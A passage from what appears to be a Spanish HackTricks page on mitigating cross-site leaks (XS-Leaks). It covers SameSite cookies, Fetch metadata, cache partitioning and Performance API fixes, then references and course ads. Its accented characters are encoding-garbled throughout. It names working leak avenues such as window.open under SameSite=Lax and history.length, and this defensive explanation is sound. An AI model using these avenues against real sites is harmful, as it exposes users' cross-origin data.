* **Solicitudes JavaScript**. Las solicitudes JavaScript cross-origin se utilizan a menudo en ataques XS-Leak, porque un atacante tiene control fino sobre la solicitud emitida. Sin embargo, dado que estas solicitudes no est√°n habilitadas para CORS, est√°n sujetas a las mismas restricciones que las solicitudes enviadas por elementos HTML, como scripts o im√°genes. Por lo tanto, el impacto de esta t√©cnica de leak tambi√©n puede ser **mitigado por CORP y CORB**.

M√©todos m√°s gen√©ricos:

* **Metadatos de Fetch**. Estos encabezados de solicitud permiten a los propietarios de servidores comprender mejor c√≥mo el navegador del usuario caus√≥ una solicitud espec√≠fica. En Chrome, los encabezados Sec-Fetch-\* se agregan autom√°ticamente a cada solicitud y proporcionan metadatos sobre la procedencia de la solicitud. Por ejemplo, Sec-Fetch-Dest: image se activ√≥ desde un elemento de imagen. Las aplicaciones web pueden entonces elegir bloquear solicitudes basadas en esa informaci√≥n.
* **Cookies Same-Site**. La bandera de cookie Same-Site permite a los sitios web declarar **si una cookie debe estar restringida a un contexto same-site o firstparty**. Todos los navegadores principales admiten cookies Same-Site. En GC, las cookies sin el atributo ahora son Lax por defecto. Para XS-Leaks, **las cookies Same-Site limitan dr√°sticamente las posibilidades de ataque de leak**. Por otro lado, las t√©cnicas de leak que dependen de **`window.open` a√∫n funcionan con `SameSite=Lax`**. Los sitios web que utilizan **otros m√©todos de autenticaci√≥n**, como certificados del lado del cliente y autenticaci√≥n HTTP, **siguen siendo vulnerables**.
* **Desvinculaci√≥n de Identificadores Cross-Origin (COIU)**. COIU, tambi√©n conocido como Aislamiento de Primera Parte (FPI), es una caracter√≠stica de seguridad opcional que los usuarios pueden habilitar en la configuraci√≥n experta de FF (about:config) y fue introducida inicialmente en Tor Browser. En una vista abstracta, es un contexto same-site extendido. **Vincula m√∫ltiples recursos** (por ejemplo, Cookies, Cache, Almacenamientos del lado del cliente) **a la primera parte** en lugar de compartirlos entre todos los sitios web visitados. Si se habilita, COIU disminuye dr√°sticamente la aplicabilidad de XS-Leaks, ya que solo los m√©todos que usan pop-ups todav√≠a son posibles para cumplir con el requisito de primera parte de la pol√≠tica.
* **Protecciones de Seguimiento**. Apple implement√≥ un mecanismo de privacidad llamado **Prevenci√≥n Inteligente de Seguimiento (ITP)** en SA que tiene como objetivo combatir el seguimiento cross-site limitando las capacidades de las cookies y otras APIs web. En versiones m√°s recientes de SA, ITP bloquea todas las cookies de terceros por defecto sin excepciones \[74]. Este bloqueo previene todos los leaks que no se basan en pop-ups. FF adopt√≥ un enfoque similar con la Prevenci√≥n Mejorada de Seguimiento (ETP), pero solo bloquean cookies espec√≠ficas de terceros que pertenecen a proveedores de seguimiento. En el contexto de XS-Leaks, ETP solo mitiga las t√©cnicas de leak que se dirigen a estos dominios de seguimiento.
* **Extensiones de Navegador**. Los usuarios conscientes de la seguridad pueden usar **extensiones de navegador para prevenir ciertos m√©todos de inclusi√≥n**.

### Mitigaciones de T√©cnicas de Leak

* **Manejador de Eventos**. La **mitigaci√≥n m√°s efectiva** en esta t√©cnica de leak ser√≠a **negarlas todas**, pero esto romper√≠a la mayor√≠a de las aplicaciones web en Internet. Por lo tanto, proponemos **reducir la cantidad de informaci√≥n necesaria que se puede recopilar dentro de los eventos**. Por ejemplo, el evento de violaci√≥n de CSP no debe contener la URL de redirecci√≥n objetivo en el campo blockedURI. Este comportamiento est√° implementado en FF y en versiones m√°s recientes de GC ‚Äì solo SA sigue siendo vulnerable.
* **Mensajes de Error**. Para mitigar XS-Leaks basados en mensajes de error de t√©cnicas de leak, hay dos requisitos principales. Primero, **los mensajes de error no deben contener informaci√≥n detallada**, de manera similar a los mensajes del manejador de eventos. Segundo, los navegadores deben **minimizar la ocurrencia de mensajes de error**. XS-Leaks como Error de SRI, ContentDocument XFO o Fetch Redirect detectan si se lanza un mensaje de error o no.
* **L√≠mites Globales**. Arreglar t√©cnicas de leak que abusan de l√≠mites globales es relativamente complejo porque dependen de restricciones f√≠sicas. La recomendaci√≥n general es **restringir los l√≠mites globales en una peque√±a base por sitio**. Si el l√≠mite global es 1, como para la API de Pago, el atacante puede intentar activar silenciosamente la UI de WebPayment en cualquier momento, lo cual solo tiene √©xito si la UI no est√° siendo utilizada concurrentemente por otra pesta√±a. Recomendamos acceder a la API de Pago solo cuando se haya utilizado un evento confiable. De esta manera, el l√≠mite global se establece en cero a menos que el usuario d√© su consentimiento, como un clic con el bot√≥n izquierdo del rat√≥n en una ventana de di√°logo, lo que establece el l√≠mite global en uno.
* **Estado Global**. Cualquier **propiedad del estado global de un navegador no debe ser accesible**. Por ejemplo, FF es el √∫nico navegador que actualiza el estado global del historial cuando ocurre una redirecci√≥n, lo que resulta en la lectura de history.length. Los navegadores deber√≠an crear una nueva propiedad de historial cuando ocurre una redirecci√≥n en lugar de almacenarla globalmente. Otros ejemplos son recursos compartidos, como cach√©s. Los leaks de cach√© abusan de la cach√© compartida utilizada para todos los sitios web abiertos en un navegador. Para mitigar completamente las t√©cnicas de leak de cach√©, la cach√© HTTP debe estar particionada en una base por sitio, como est√° implementado por SA, GC y FF. Cabe se√±alar que en SA los iframes no est√°n afectados por la partici√≥n de cach√©.
* **API de Rendimiento**. Demostramos que la API de Rendimiento es una excelente t√©cnica de leak. En muchos XS-Leaks, pudimos detectar la diferencia de si la respuesta de una solicitud cross-origin tiene o no una entrada de rendimiento. Como unificaci√≥n, recomendamos asegurar que todas las solicitudes creen tal entrada y solo el subconjunto correcto de informaci√≥n de tiempo se registre para solicitudes cross-origin.

## Referencias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias **m√°s avanzadas**.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
